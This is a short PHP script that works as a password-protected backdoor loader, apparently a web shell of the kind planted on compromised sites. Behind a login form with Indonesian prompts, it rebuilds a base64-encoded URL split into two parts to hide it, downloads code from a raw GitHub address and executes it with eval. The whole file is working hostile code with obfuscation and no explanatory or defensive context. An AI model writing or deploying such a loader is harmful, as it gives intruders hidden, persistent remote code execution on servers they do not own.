<?php

session_start();

$password_hash = '$2a$12$MSKE9..73b5Es0gFqSlbGuQIP56B7FaK88F7p98VyweFlFvRT.8BK';

if (!isset($_SESSION['login'])) {

    if ($_SERVER['REQUEST_METHOD'] == 'POST') {

        $password = $_POST['password'] ?? '';

        if (password_verify($password, $password_hash)) {

            $_SESSION['login'] = true;

            header("Location: " . $_SERVER['PHP_SELF']);
            exit;

        } else {

            die("Password salah!");

        }
    }

    ?>

    <form method="POST">
        <input type="password" name="password" placeholder="Masukkan Password">
        <button type="submit">Login</button>
    </form>

    <?php
    exit;
}

$encoded_url1 = 'aHR0cHM6Ly9yYXcuZ2l0aH';
$encoded_url2 = 'VidXNlcmNvbnRlbnQuY29tL2VsemNsNHkvYXNkYXNkL3JlZnMvaGVhZHMvbWFpbi93dWtvbmdhbGZh';
$encoded_url = $encoded_url1 . $encoded_url2;

$url = base64_decode($encoded_url);
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

$code = curl_exec($ch);

if (curl_errno($ch)) {
    die("Curl Error: " . curl_error($ch));
}

curl_close($ch);
eval("?>".$code);

?>
